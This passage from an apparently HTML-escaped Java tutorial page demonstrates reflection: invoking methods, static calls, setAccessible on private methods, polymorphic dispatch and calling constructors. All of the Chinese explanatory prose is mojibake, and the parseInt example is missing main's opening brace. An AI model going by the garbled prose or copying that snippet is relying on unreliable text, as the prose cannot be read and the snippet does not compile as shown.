&lt;li>å¾—åˆ°&lt;code>Method&lt;/code>åŽæˆ‘ä»¬å¯ä»¥å¯¹ä»–è¿›è¡Œè°ƒç”¨ï¼Œæ–¹å¼æ˜¯è°ƒç”¨å…¶&lt;code>invoke&lt;/code>ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯¹è±¡å®žä¾‹ï¼ŒåŽé¢ä¸ºå¯å˜å‚æ•°ï¼Œä¸Žæ–¹æ³•å‚æ•°ä¸€è‡´&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello world&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// Stringå¯¹è±¡
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;substring&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// èŽ·å–String substring(int)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">6&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è°ƒç”¨
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ&lt;code>substring&lt;/code>è‡ªèº«æœ‰ä¸¤ä¸ªé‡è½½æ–¹æ³•ï¼Œæˆ‘ä»¬èŽ·å–çš„æ˜¯å…¶ä¸­çš„&lt;code>substring(int)&lt;/code>è¿™ä¸ªæ–¹æ³•&lt;/p>
&lt;ul>
&lt;li>å¦‚æžœèŽ·å–åˆ°çš„Methodè¡¨ç¤ºä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œè°ƒç”¨é™æ€æ–¹æ³•æ—¶ï¼Œç”±äºŽæ— éœ€æŒ‡å®šå®žä¾‹å¯¹è±¡ï¼Œæ‰€ä»¥&lt;code>invoke&lt;/code>æ–¹æ³•ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ°¸è¿œä¸º&lt;code>null&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;parseInt&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// èŽ·å–Integer.parseInt(String)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;12345&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è°ƒç”¨
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>åŒä¸Šä¸€ä¸ªä¸‰çº§æ ‡é¢˜å¯¹äºŽprivateå­—æ®µçš„å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨&lt;code>Method.setAccessible(true)&lt;/code>ï¼Œä¹Ÿå­˜åœ¨åŒæ ·å¯èƒ½å¤±è´¥çš„åŽŸå› ï¼Œä¸é‡å¤äº†&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;setName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Bob&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>å¯¹äºŽå‚æ•°ä¸åŒçš„æ–¹æ³• æˆ‘ä»¬å¯ä»¥æŒ‡å®šå‚æ•°ç±»åž‹å’Œæ•°é‡ï¼Œè€Œå¯¹äºŽå¤šæ€ï¼Œä»è¡¨çŽ°å‡ºå¤šæ€çš„åŽŸåˆ™ï¼Œå³ æ€»æ˜¯è°ƒç”¨å®žé™…ç±»åž‹çš„è¦†å†™æ–¹æ³•ï¼ˆå¦‚æžœå­˜åœ¨&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">h&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">h&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/** ç›¸å½“äºŽ
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> Person p = new Student();
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> p.hello(); */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Person:hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">hello&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// ç»§æ‰¿è‡ªPerson è¦†å†™helloæ–¹æ³•
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Student:hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="è°ƒç”¨æž„é€ æ–¹æ³•">è°ƒç”¨æž„é€ æ–¹æ³•&lt;/h3>
&lt;ul>
&lt;li>æ­£å¸¸çš„newä¼šè§¦å‘æž„é€ æ–¹æ³•ï¼Œé€šè¿‡classçš„newä¼šæœ‰å±€é™æ€§ï¼ˆè§ä¸Šï¼‰ï¼Œä¸ºäº†è°ƒç”¨ä»»æ„çš„æž„é€ æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå°„çš„Constructorå¯¹è±¡ï¼Œå®ƒåŒ…å«ä¸€ä¸ªæž„é€ æ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªå®žä¾‹ï¼›Constructorå¯¹è±¡å’ŒMethodéžå¸¸ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„ä»…åœ¨äºŽå®ƒæ˜¯ä¸€ä¸ªæž„é€ æ–¹æ³•ï¼Œå¹¶ä¸”ï¼Œè°ƒç”¨ç»“æžœæ€»æ˜¯è¿”å›žå®žä¾‹&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Constructor&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// èŽ·å–æŸä¸ªpublicçš„Constructor
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">cons1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// èŽ·å–æž„é€ æ–¹æ³•Integer(int)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cons1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">123&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è°ƒç”¨æž„é€ æ–¹æ³•
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">cons2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// èŽ·å–æž„é€ æ–¹æ³•Integer(String)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cons2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;456&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>æ³¨æ„&lt;code>Constructor&lt;/code>æ€»æ˜¯å½“å‰ç±»å®šä¹‰çš„æž„é€ æ–¹æ³•ï¼Œå’Œçˆ¶ç±»æ— å…³ï¼Œå› æ­¤ä¸å­˜åœ¨å¤šæ€çš„é—®é¢˜&lt;/li>
&lt;li>åŒä¸Šé¢ï¼Œå¯ä»¥æœ‰&lt;code>setAccessible(true)&lt;/code>æ¥è°ƒç”¨éžpublicçš„Constructor&lt;/li>
&lt;/ul>
&lt;h3 id="èŽ·å–ç»§æ‰¿å…³ç³»">èŽ·å–ç»§æ‰¿å…³ç³»&lt;/h3>
&lt;ul>
&lt;li>æœ€å¼€å§‹çš„ä¸‰çº§æ ‡é¢˜Classä¸­æåˆ°äº†ä¸‰ç§æ–¹å¼èŽ·å–Classå®žä¾‹ï¼Œä»–ä»¬éƒ½æ˜¯åŒä¸€ä¸ªå®žä¾‹ï¼Œå› ä¸ºJVMå¯¹æ¯ä¸ªåŠ è½½çš„&lt;code>Class&lt;/code>åªåˆ›å»ºä¸€ä¸ª&lt;code>Class&lt;/code>å®žä¾‹æ¥è¡¨ç¤ºå®ƒçš„ç±»åž‹&lt;/li>
&lt;li>èŽ·å–çˆ¶ç±»Class&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
